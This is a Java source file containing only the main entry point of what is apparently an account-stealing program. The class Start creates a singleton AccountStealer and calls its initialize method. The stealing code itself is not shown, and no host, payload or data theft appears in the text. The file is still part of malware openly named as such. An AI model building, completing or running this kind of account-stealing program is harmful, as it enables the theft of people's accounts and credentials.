package io.github.itzgonza;

import io.github.itzgonza.impl.AccountStealer;

public class Start {

	public static void main(String[] argument) throws Exception {
		if (AccountStealer.instance == null)
		    AccountStealer.instance = new AccountStealer();
		AccountStealer.instance.initialize();
	}
	
}